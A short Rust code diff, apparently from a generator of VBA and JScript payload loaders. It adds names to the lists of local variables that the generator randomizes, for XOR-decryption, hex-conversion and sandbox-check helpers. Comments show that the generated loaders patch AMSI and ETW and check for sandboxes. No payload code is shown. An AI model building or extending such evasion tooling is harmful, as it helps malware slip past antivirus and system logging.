@@ -275,6 +275,10 @@ fn build_context(config: &LoaderConfig) -> Context {
         "vba_lv_raw", "vba_lv_sc", "vba_lv_mem", "vba_lv_oldp",
         // fn_build_str locals
         "vba_lv_bs", "vba_lv_bi",
+        // fn_hex2arr locals
+        "vba_lv_hn", "vba_lv_harr", "vba_lv_hi",
+        // fn_xor locals
+        "vba_lv_xn", "vba_lv_xk2", "vba_lv_xo", "vba_lv_xi2",
         // fn_amsi_patch helper locals
         "vba_lv_amsilib", "vba_lv_scanname", "vba_lv_amsibase", "vba_lv_scanaddr", "vba_lv_amsioldp",
         // fn_etw_patch helper locals
@@ -308,6 +312,12 @@ fn build_context(config: &LoaderConfig) -> Context {
         "jsc_lv_ea", "jsc_lv_et", "jsc_lv_ef",
         // fn_build_str locals
         "jsc_lv_bs", "jsc_lv_bi",
+        // fn_hex2arr locals (array, index)
+        "jsc_lv_ha", "jsc_lv_hi",
+        // fn_xor/fn_decrypt locals (output, index)
+        "jsc_lv_xo", "jsc_lv_xi2",
+        // sandbox bad-proc inner loop index
+        "jsc_lv_sli",
     ] {
         vars.insert(k, rand_ident(7));
     }
